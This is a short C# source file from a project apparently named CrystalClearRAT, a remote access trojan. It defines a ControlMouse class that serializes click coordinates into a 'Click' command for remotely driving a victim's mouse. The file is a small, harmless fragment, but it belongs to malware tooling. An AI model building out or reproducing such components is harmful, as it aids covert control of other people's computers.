using CrystalRATShared.Commands;
using CrystalRATShared.Serialization;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CrystalClearRAT.Functions
{
    public static class ControlMouse
    {




        public static byte[] ClickInfo(int x, int maxX, int y, int maxY)
        {
            // MousePoint info = GetCursorPosition();

            return CommandDataSerializer.Serialize(CommandFlags.Click, (writer) =>
            {
                writer.Write(x);
                writer.Write(maxX);
                writer.Write(y);
                writer.Write(maxY);
            });
        }



    }
}